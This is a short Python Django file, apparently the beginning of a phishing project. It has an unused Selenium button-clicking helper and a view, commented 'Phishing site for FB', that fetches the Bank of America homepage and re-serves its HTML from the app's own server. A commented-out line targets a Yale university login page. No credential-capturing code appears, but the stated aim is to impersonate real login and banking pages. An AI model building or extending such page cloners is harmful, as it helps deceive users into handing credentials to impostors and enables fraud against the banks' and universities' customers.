from django.http import HttpResponse
import requests
from selenium import webdriver

# Function to click button (not being used currently)
def click_button(url):
    driver = webdriver.Chrome()
    driver.get(url)
    button = driver.find_element_by_id("nav-link-accountList")
    button.click()
    return driver.current_url

# Phishing site for FB
def index(request):
    # url = 'https://secure.its.yale.edu/cas/login?service=https%3A%2F%2Fyale.instructure.com%2Flogin%2Fcas'
    url = 'https://www.bankofamerica.com/'
    req = requests.get(url)
    return HttpResponse(req.text)